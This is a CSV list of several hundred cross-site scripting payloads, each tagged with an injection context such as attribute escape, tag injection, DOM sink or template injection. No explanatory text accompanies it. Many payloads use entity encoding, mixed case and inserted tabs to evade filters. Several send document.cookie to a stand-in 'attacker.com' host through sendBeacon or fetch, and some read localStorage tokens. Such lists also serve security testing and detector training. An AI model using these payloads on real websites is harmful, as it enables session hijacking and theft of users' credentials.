payload,context
' ><svg onbeforecut=confirm(1)>,attribute_escape
<b&#97;s&#101; onb&#101;for&#101;copy=consol&#101;.log(loc&#97;tion.h&#97;sh)/>,tag_injection
 onBefOreCopY=aLerT(dOcuMenT.dOmaIn),event_handler
__proto__[%22onend%22]=alert(1),dom_sink
' ><svg on&#101;nd&#101;d=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape
""" ><svg onauxclick=confirm(location.hash)>",attribute_escape
%3C!--%3E%3Cselect onpointermove=prompt('XSS')%3E,tag_injection
onmozfullscreenchange=prompt/***/(location.hash),event_handler
"<body
oninvalid=\u0061lert(location.hash)>",tag_injection
"Obj&#101;ct.&#97;ssign(window,{""onmous&#101;wh&#101;&#101;l"":&#97;l&#101;rt})",dom_sink
""" onreset=prompt(location.hash) """,attribute_escape
"Object.assign(window,{""onvolumechange"":XMLHttpRequest})",dom_sink
"""><img src=x onpoint&#101;rmov&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
<t&#97;bl&#101; ons&#101;&#97;rch=prompt(1) ons&#101;&#97;rch=prompt(1)>,tag_injection
\%22 onsecuritypolicyviolation=prompt(1)//,attribute_escape
'><img src=x onscrollend=prompt(location.hash)>,attribute_escape
"\%22 onpointerdown=console.log(String.fromCharCode(88,83,83))//",attribute_escape
<tr onTogGle=coNsoLe.Log(doCumEnt.doMaiN)/>,tag_injection
"""><img src=x onp&#97;g&#101;show=consol&#101;.log(loc&#97;tion.h&#97;sh)>",attribute_escape
\' ong&#101;stur&#101;&#101;nd=prompt('XSS')//,attribute_escape
&quOt; onFocUsiN=cOnsOle.loG(lOcaTioN.hAsh) x=&qUot;,attribute_escape
onmozfullscr&#101;&#101;nch&#97;ng&#101;=prompt/***/(1),event_handler
"__pRotO__[""oNdrAgoVer""]=AleRt(BtoA(dOcuMenT.cOokIe))",dom_sink
%22><img src=x onbeforepaste=alert(%27XSS%27)>,attribute_escape
&quOt; onGotPoiNteRcaPtuRe=ConFirM(lOcaTioN.hAsh) x=&qUot;,attribute_escape
"javascr	ipt:alert/***/(String.fromCharCode(88,83,83))",js_uri
`><img src=x ongotpointercapture=prompt(%27XSS%27)>,attribute_escape
"Object.assign(window,{""oninvalid"":fetch})",dom_sink
\%22 onbegin=console.log(location.hash)//,attribute_escape
"	onpointercancel=\u0061lert(String.fromCharCode(88,83,83))",event_handler
"`%3E%3Cimg src=x onkeydown=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape
%22 ><svg onplaying=alert(location.hash)>,attribute_escape
onb&#101;for&#101;p&#97;st&#101;=consol&#101;.log&#40;loc&#97;tion.h&#97;sh&#41;,event_handler
j&#97;vascript:prompt(document.domain),js_uri
"'%3E%3Cimg src=x onpointerover=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape
"SetTimEouT(""ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))"",0)",dom_sink
' onscrollsnapchange=console.log(1) ',attribute_escape
<math/onscrollend=prompt(document.domain)>,tag_injection
`%3E%3Cimg src=x onbeforetoggle=confirm(location.hash)%3E,attribute_escape
onpromptdismiss=javascript:prompt(1),event_handler
"' ><svG oNstAllEd=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
 oncontextmenu=confirm('XSS'),event_handler
"(n&#101;w Function(""f&#101;tch('XSS')""))();",dom_sink
"location=""javascr	ipt:eval(document.cookie+'&loc='+location.href)""",dom_sink
"OnkEydOwn=alErt&#40;STriNg.FroMChArCOde(88,83,83)&#41;",event_handler
%27><img src=x onbeforecut=confirm(1)>,attribute_escape
"__proto__[""onauxclick""]=confirm(localStorage.getItem('token'))",dom_sink
`><img src=x ontransitionend=\u0061lert(document.domain)>,attribute_escape
j&#97;vascript:prompt(1),js_uri
OnwHeeL=aLerT/*X*/(1),event_handler
#seT($X='ConFirM('XSS')')$x,template_injection
' ><svG oNenD=aLerT('XSS')>,attribute_escape
"Object.assign(window,{""ondblclick"":confirm})",dom_sink
%22 onbeforepaste=confirm(document.domain) %22,attribute_escape
"LocAtiOn.HreF=""JavAscRipT:fEtcH(dOcuMenT.dOmaIn)""",dom_sink
"location=""javascript:confirm(btoa(document.cookie))""",dom_sink
\' ontouch&#101;nd=consol&#101;.log('XSS')//,attribute_escape
<plaintext x=y onrepeat=prompt(%27XSS%27)>,tag_injection
""" onpromptaction=console.log('XSS') """,attribute_escape
	ontr&#97;nsitionst&#97;rt=prompt(loc&#97;tion.h&#97;sh),event_handler
' ><svg ontr&#97;nsition&#101;nd=&#97;l&#101;rt(1)>,attribute_escape
"data:text/html,<script>confirm(1)</script>",js_uri
<%= alert(1) %>,template_injection
\' OnfOcuSin=prOmpT(1)//,attribute_escape
<blInk	onKeyPreSs=ProMpt(doCumEnt.doMaiN)>,tag_injection
%27><img src=x onscrollsnapchange=alert(1)>,attribute_escape
%27 ><svg onerror=console.log(location.hash)>,attribute_escape
"location.href=""javascript:fetch('XSS')""",dom_sink
'><img src=x ong&#101;stur&#101;&#101;nd=&#97;l&#101;rt(1)>,attribute_escape
"\"" onmous&#101;&#101;nt&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
"document.body.innerHTML=""<img src=x onerror=XMLHttpRequest(btoa(document.cookie))>""",dom_sink
'><img src=x onpoint&#101;rr&#97;wupd&#97;t&#101;=prompt('XSS')>,attribute_escape
"__proto__[%22onpointerover%22]=confirm(String.fromCharCode(88,83,83))",dom_sink
"on&#97;nim&#97;tionc&#97;nc&#101;l=confirm&#40;String.fromCh&#97;rCod&#101;(88,83,83)&#41;",event_handler
"__proto__[""oninv&#97;lid""]=f&#101;tch(1)",dom_sink
""" on&#101;nd=&#97;l&#101;rt('XSS') """,attribute_escape
\' OndRagStaRt=ConSolE.lOg(DocUmeNt.DomAin)//,attribute_escape
"Object.assign(window,{%22ondragenter%22:console.log})",dom_sink
	onr&#101;s&#101;t=confirm('XSS'),event_handler
"\' OnrEseT=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))//",attribute_escape
""" onsearch=alert(1) """,attribute_escape
%3Carea onpageshow=prompt('XSS') onpageshow=prompt('XSS')%3E,tag_injection
%22 ><svg onpromptdismiss=prompt(location.hash)>,attribute_escape
"<script>console.log`String.fromCharCode(88,83,83)`</script>",script_injection
'><img src=x onbeforepaste=alert(1)>,attribute_escape
`%3E%3Cimg src=x onbeforepaste=prompt(1)%3E,attribute_escape
"Obj&#101;ct.&#97;ssign(window,{""ondr&#97;gov&#101;r"":XMLHttpR&#101;qu&#101;st})",dom_sink
' ><svg onpagehide=prompt(document.domain)>,attribute_escape
' onpromptdismiss=console.log('XSS') ',attribute_escape
"Object.assign(window,{""onmousedown"":\u0061lert})",dom_sink
%22><template oncontextmenu=console.log(1)>,tag_injection
"<tr onTraNsiTioNenD=pRomPt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
%3Canimatetransform src=x onpointerdown=prompt(1)%3E,tag_injection
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=pRomPt(NavIgaTor.seNdBEacOn('//AttAckEr.Com',dOcuMenT.cOokIe))>""",dom_sink
&quOt; onInvAliD=cOnfIrm(1) x=&quOt;,attribute_escape
"""><img src=x oninv&#97;lid=confirm(1)>",attribute_escape
' ><svg onplay=confirm(document.domain)>,attribute_escape
%3Canimatemotion/ondblclick=console.log(1)%3E,tag_injection
<tr onanimationend=prompt('XSS')>,tag_injection
&quot; ondr&#97;gov&#101;r=prompt(1) x=&quot;,attribute_escape
%3Cscript%3Ewindow['alert'](document.domain)%3C/script%3E,script_injection
"document.body.innerHTML=""<img src=x onerror=confirm(localStorage.getItem('token'))>""",dom_sink
"\"" onpointerover=console.log('XSS')//",attribute_escape
"Object.assign(window,{""ondragstart"":fetch})",dom_sink
%22 ><svg onbeforetoggle=console.log(%27XSS%27)>,attribute_escape
"Obj&#101;ct.&#97;ssign(window,{""onc&#97;npl&#97;y"":&#101;v&#97;l})",dom_sink
\' ondrop=confirm(1)//,attribute_escape
<scr	ipt>/*/console.log(location.hash)</scr	ipt>,script_injection
""" onmousewheel=\u0061lert(1) """,attribute_escape
"ObjEct.asSigN(wIndOw,{""oNcoNteXtmEnu"":cOnfIrm})",dom_sink
<scr	ipt	>confirm('XSS')</scr	ipt>,script_injection
%3Cmeta ontransitionstart=alert(location.hash) ontransitionstart=alert(location.hash)%3E,tag_injection
`><Img srC=x onEnd=prOmpT(lOcaTioN.hAsh)>,attribute_escape
"<maRquEe X=y onBefOreTogGle=alErt(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
"<noscript onbeforematch=confirm(String.fromCharCode(88,83,83))/>",tag_injection
"Obj&#101;ct.&#97;ssign(window,{""ontouch&#101;nd"":prompt})",dom_sink
'><img src=x onwebkitfullscreenchange=alert('XSS')>,attribute_escape
"__proto__[""ongesturestart""]=\u0061lert(localStorage.getItem('token'))",dom_sink
""" ><svg onfocusout=confirm(loc&#97;tion.h&#97;sh)>",attribute_escape
""" onh&#97;shch&#97;ng&#101;=confirm(docum&#101;nt.dom&#97;in) """,attribute_escape
"data:text/html,%3Cscript%3Econfirm('XSS')%3C/script%3E",js_uri
"__proto__[""ontouch&#101;nd""]=prompt(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))",dom_sink
&quot; onselect=console.log(location.hash) x=&quot;,attribute_escape
<svg/onpromptdismiss=alert(location.hash)>,tag_injection
<boDy OncLosE=cOnsOle.loG('XSS')/>,tag_injection
"	onpromptaction=confirm(String.fromCharCode(88,83,83))",event_handler
"""%3E%3Cimg src=x onbegin=alert(String.fromCharCode(88,83,83))%3E",attribute_escape
"SetIntErvAl(""coNsoLe.Log(doCumEnt.coOkiE)"",100)",dom_sink
%22><img src=x onauxclick=prompt(location.hash)>,attribute_escape
"<plAinTexT sRc=X oNpaUse=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
""" ><svg onc&#97;npl&#97;y=consol&#101;.log(loc&#97;tion.h&#97;sh)>",attribute_escape
"\"" onpoint&#101;rr&#97;wupd&#97;t&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
%3C!--%3E%3Ctable ontouchend=prompt(document.domain)%3E,tag_injection
"\' onp&#97;us&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
"""><img src=x ontouchmove=\u0061lert(location.hash)>",attribute_escape
`><Img srC=x onMouSeeNteR=aLerT(lOcaTioN.hAsh)>,attribute_escape
""" ><svG oNbeGin=coNfiRm(1)>",attribute_escape
'><Img srC=x onPoiNteRdoWn=AleRt(DocUmeNt.DomAin)>,attribute_escape
<anImaTetRanSfoRm	OnpOinTerDowN=pRomPt(1)>,tag_injection
"Obj&#101;ct.&#97;ssign(window,{""onb&#101;for&#101;cut"":confirm})",dom_sink
onbeforetoggle=prompt&#40;'XSS'&#41;,event_handler
"&quot; onb&#101;for&#101;p&#97;st&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape
<noscript onbeforematch=console.log(%27XSS%27)/>,tag_injection
<tr x=y onpoint&#101;rr&#97;wupd&#97;t&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
onpointercancel=javascript:console.log(1),event_handler
' onscroll&#101;nd=prompt(loc&#97;tion.h&#97;sh) ',attribute_escape
"""><img src=x on&#101;nd=confirm('XSS')>",attribute_escape
"onk&#101;ydown=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
"\"" onsecuritypolicyviolation=console.log('XSS')//",attribute_escape
	onmouseup=confirm(document.domain),event_handler
""" ><svg onclose=alert(document.domain)>",attribute_escape
"""><Img srC=x onScrOllSnaPchAngE=aLerT(1)>",attribute_escape
"s&#101;tTim&#101;out(""f&#101;tch(loc&#97;tion.h&#97;sh)"",0)",dom_sink
<buTtoN sRc=X oNdrAgeNteR=aLerT(lOcaTioN.hAsh)>,tag_injection
&quOt; onDroP=aLerT('XSS') X=&QuoT;,attribute_escape
${{ConFirM('XSS')}},template_injection
%27 oninput=alert(document.domain) %27,attribute_escape
"ObjEct.asSigN(wIndOw,{""oNpaUse"":eVal})",dom_sink
"Object.assign(window,{""onfocus"":console.log})",dom_sink
' onmous&#101;wh&#101;&#101;l=prompt(docum&#101;nt.dom&#97;in) ',attribute_escape
%3Cembed/onwebkitfullscreenchange=confirm(location.hash)%3E,tag_injection
"""><NosCriPt OngEstUreStaRt=AleRt('XSS')>",tag_injection
%22 onpointerrawupdate=alert(location.hash) %22,attribute_escape
"<m&#97;rqu&#101;&#101;
onpopst&#97;t&#101;=&#97;l&#101;rt('XSS')>",tag_injection
"onpromptdismiss=javascript:prompt(String.fromCharCode(88,83,83))",event_handler
"EleMenT.iNseRtADjaCenTHTML(""beForEenD"",""<iMg Src=x OneRroR=XMLHTtpReqUesT(dOcuMenT.cOokIe)>"")",dom_sink
<&#97;nim&#97;t&#101;motion on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log('XSS')/>,tag_injection
"<noscr	ipt
onpointerdown=prompt(document.domain)>",tag_injection
`%3E%3Cimg src=x onanimationiteration=console.log(1)%3E,attribute_escape
' ><svg onwebkitfullscreenchange=prompt('XSS')>,attribute_escape
"<diAloG
oNpoIntEroVer=coNfiRm(1)>",tag_injection
&quot; onwebkitanimationend=confirm(%27XSS%27) x=&quot;,attribute_escape
""" onkeydown=alert(location.hash) """,attribute_escape
"\"" ontouchmov&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)//",attribute_escape
"""><img src=x onpointerover=console.log('XSS')>",attribute_escape
&quot; ong&#101;stur&#101;&#101;nd=prompt('XSS') x=&quot;,attribute_escape
&quOt; onScrOllEnd=prOmpT(lOcaTioN.hAsh) x=&qUot;,attribute_escape
"&quot; onpoint&#101;rup=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape
' %3E%3Csvg oninvalid=confirm(1)%3E,attribute_escape
" onDblCliCk=ProMpt(StRinG.fRomChaRCoDe(88,83,83))",event_handler
<img onwebkitfullscreenchange=\u0061lert('XSS') onwebkitfullscreenchange=\u0061lert('XSS')>,tag_injection
ondragenter=prompt&#40;document.domain&#41;,event_handler
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=f&#101;tch(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))>""",dom_sink
onp&#97;g&#101;show=confirm/*x*/(1),event_handler
' ><svG oNpoIntErmOve=prOmpT('XSS')>,attribute_escape
""" ><svg onpointermove=alert(document.domain)>",attribute_escape
"<xsS x=y OnaNimAtiOnsTarT=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
<base ongestureend=console.log(document.domain)>,tag_injection
onp&#97;st&#101;=prompt(docum&#101;nt.dom&#97;in),event_handler
%3Cdialog src=x onpointerover=confirm(1)%3E,tag_injection
location.href=%22javascript:console.log(%27//attacker.com/?c=%27+document.cookie)%22,dom_sink
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=fetch(%27//attacker.com/?c=%27+document.cookie)>%22)",dom_sink
onkeydown=alert(%27XSS%27),event_handler
"""><Img srC=x onMozFulLscReeNchAngE=aLerT(STriNg.FroMChArCOde(88,83,83))>",attribute_escape
\%27 onpointerrawupdate=prompt(%27XSS%27)//,attribute_escape
<d&#101;t&#97;ils x=y onr&#101;p&#101;&#97;t=prompt(1)>,tag_injection
<details src=x onrepeat=prompt(1)>,tag_injection
"Object.assign(window,{""onwheel"":confirm})",dom_sink
%27 onclick=prompt(%27XSS%27) %27,attribute_escape
"Object.assign(window,{""onfullscreenchange"":confirm})",dom_sink
"""><img src=x onmous&#101;wh&#101;&#101;l=prompt('XSS')>",attribute_escape
<imG	oNweBkiTfuLlsCreEncHanGe=AleRt('XSS')>,tag_injection
&quot; ons&#101;&#97;rch=&#97;l&#101;rt('XSS') x=&quot;,attribute_escape
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=fetch(document.domain)>"")",dom_sink
"OngOtpOinTerCapTurE=jAvaScrIpt:coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))",event_handler
"<marquee onbeforetoggle=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection
%3Cobject	onwebkitanimationend=alert(location.hash)%3E,tag_injection
"'><img src=x onpl&#97;ying=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
"document.write(""<img src=x onerror=XMLHttpRequest('XSS')>"")",dom_sink
"javascr	ipt:%0aalert(String.fromCharCode(88,83,83))",js_uri
"eval(""fetch(document.domain)"")",dom_sink
' ><svg ong&#101;stur&#101;&#101;nd=&#97;l&#101;rt(1)>,attribute_escape
"s&#101;tTim&#101;out(""&#97;l&#101;rt(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))"",0)",dom_sink
%27 onscrollsnapchange=console.log(1) %27,attribute_escape
"Object.assign(window,{""onchange"":eval})",dom_sink
"Obj&#101;ct.&#97;ssign(window,{""ons&#101;&#97;rch"":&#101;v&#97;l})",dom_sink
onsubmit=confirm(1),event_handler
<plAinTexT x=y OnpAgeRevEal=alErt(loCatIon.haSh)>,tag_injection
"%27 onfocus=console.log(String.fromCharCode(88,83,83)) %27",attribute_escape
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=pRomPt(1)>""",dom_sink
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=f&#101;tch(bto&#97;(docum&#101;nt.cooki&#101;))>"")",dom_sink
#set($x=%27confirm(document.domain)%27)$x,template_injection
ontransitionstart=console.log(%27XSS%27),event_handler
JavAscRipT:vOid(prOmpT('XSS')),js_uri
%27 onfocus=console.log(1) %27,attribute_escape
<select onmousewheel=alert(document.domain)/>,tag_injection
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=XMLHttpR&#101;qu&#101;st(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))>"")",dom_sink
%22><script>alert(location.hash)</script>,script_injection
"&quot; ontouchst&#97;rt=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape
&quOt; onTraNsiTioNenD=aLerT(1) x=&qUot;,attribute_escape
<title onclick=confirm('XSS')/>,tag_injection
"window[""eval""](String.fromCharCode(88,83,83))",dom_sink
"<a
onmozfullscreenchange=\u0061lert(location.hash)>",tag_injection
 oncut=alert(1),event_handler
onbeforepaste=confirm(1),event_handler
"element.setAttribute(""onclick"",""XMLHttpRequest('XSS')"")",dom_sink
<!--><td onsubmit=confirm(docum&#101;nt.dom&#97;in)>,tag_injection
<object/onmozfullscreenchange=console.log(1)>,tag_injection
OnaNimAtiOniTerAtiOn=ProMpt(doCumEnt.doMaiN),event_handler
"__pRotO__[""oNcoPy""]=XMLHTtpReqUesT(dOcuMenT.dOmaIn)",dom_sink
<iframe src=x oninput=console.log(location.hash)>,tag_injection
"__pRotO__[""oNauXclIck""]=ConFirM(lOcaLStOraGe.GetIteM('TokEn'))",dom_sink
""" onmous&#101;down=consol&#101;.log('XSS') """,attribute_escape
<!--><m&#101;t&#97; ons&#101;curitypolicyviol&#97;tion=prompt('XSS')>,tag_injection
"Obj&#101;ct.&#97;ssign(window,{""ondr&#97;gov&#101;r"":prompt})",dom_sink
<script>console.log(document.domain)</script>,script_injection
<anImaTetRanSfoRm/OnpOinTerDowN=pRomPt(1)>,tag_injection
<form onr&#101;s&#101;t=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
' oNfuLlsCreEncHanGe=AleRt(LocAtiOn.HasH) ',attribute_escape
`><Img srC=x onInvAliD=cOnfIrm(1)>,attribute_escape
"Object.assign(window,{""ontouchend"":console.log})",dom_sink
\' ontr&#97;nsition&#101;nd=confirm('XSS')//,attribute_escape
' onwheel=console.log(document.domain) ',attribute_escape
__proto__[%22onended%22]=XMLHttpRequest(location.hash),dom_sink
"\' ondblclick=alert(String.fromCharCode(88,83,83))//",attribute_escape
"${{%27alert(document.cookie)%27.replace(%27alert(document.cookie)%27,%27%27)}}",template_injection
OnmOzfUllScrEenChaNge=coNsoLe.Log/**/(dOcuMenT.dOmaIn),event_handler
onmouseenter=javascript:confirm(location.hash),event_handler
" onTogGle=coNfiRm(StrIng.frOmCHarCodE(88,83,83))",event_handler
<img onreset=console.log(document.domain)/>,tag_injection
"%22 ><svg oncopy=alert(String.fromCharCode(88,83,83))>",attribute_escape
<!--><tr ontoggle=console.log(document.domain)>,tag_injection
' onp&#97;g&#101;show=prompt(docum&#101;nt.dom&#97;in) ',attribute_escape
&#106;AvaScrIpt:coNfiRm(LocAtiOn.HasH),js_uri
"\"" oninv&#97;lid=prompt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
""" %3E%3Csvg onscrollend=prompt(location.hash)%3E",attribute_escape
""" onrepeat=\u0061lert(location.hash) """,attribute_escape
""" ><svg ongestureend=console.log('XSS')>",attribute_escape
""" %3E%3Csvg onpause=console.log('XSS')%3E",attribute_escape
oninput=prompt(loc&#97;tion.h&#97;sh),event_handler
"__proto__[""on&#97;uxclick""]=&#101;v&#97;l('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)",dom_sink
"\"" onhashchange=prompt('XSS')//",attribute_escape
"%3Cform
ongesturestart=console.log('XSS')%3E",tag_injection
onpointermove=\u0061lert/***/(document.domain),event_handler
"WinDow[""cOnsOle.loG""](StRinG.fRomChaRCoDe(88,83,83))",dom_sink
`><img src=x onmousedown=alert(location.hash)>,attribute_escape
%3Carea onpointercancel=console.log(document.domain)%3E,tag_injection
"\"" onfullscreenchange=\u0061lert(location.hash)//",attribute_escape
<t&#101;mpl&#97;t&#101;/oncont&#101;xtm&#101;nu=consol&#101;.log(1)>,tag_injection
%3Cdialog onplay=prompt(document.domain)/%3E,tag_injection
&quot; ontoggle=alert(document.domain) x=&quot;,attribute_escape
'><img src=x onpopstate=\u0061lert(document.domain)>,attribute_escape
	onpoint&#101;rup=&#97;l&#101;rt(docum&#101;nt.dom&#97;in),event_handler
"' ><svg onb&#101;gin=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
"\%27 ontransitionrun=console.log(String.fromCharCode(88,83,83))//",attribute_escape
<scr	ipt/onkeydown=confirm(document.domain)>,tag_injection
""" onerror=console.log(location.hash) """,attribute_escape
"location=""javascript:eval(document.cookie+'&loc='+location.href)""",dom_sink
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=console.log(document.cookie)>"")",dom_sink
`><img src=x ong&#101;stur&#101;&#101;nd=prompt(docum&#101;nt.dom&#97;in)>,attribute_escape
' ><svg onp&#97;st&#101;=confirm('XSS')>,attribute_escape
 onscroll&#101;nd=prompt(1),event_handler
"ObjEct.asSigN(wIndOw,{""oNweBkiTanImaTioNenD"":FetCh})",dom_sink
"Object.assign(window,{%22onload%22:fetch})",dom_sink
%22 onkeydown=alert(location.hash) %22,attribute_escape
